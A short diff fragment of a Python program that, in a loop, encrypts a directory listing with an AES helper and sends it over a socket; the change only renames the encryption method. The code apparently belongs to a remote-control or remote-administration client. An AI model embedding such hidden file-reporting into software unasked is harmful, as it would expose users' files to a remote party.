@@ -418,7 +418,7 @@ while True:
                 files = str(files)
             except:
                 files = "Directory not found"
-            efiles = AES256.s_encrypt(files, d_key)
+            efiles = AES256._encrypt(files, d_key)
 
             send_one_message(s, efiles)
             print("")
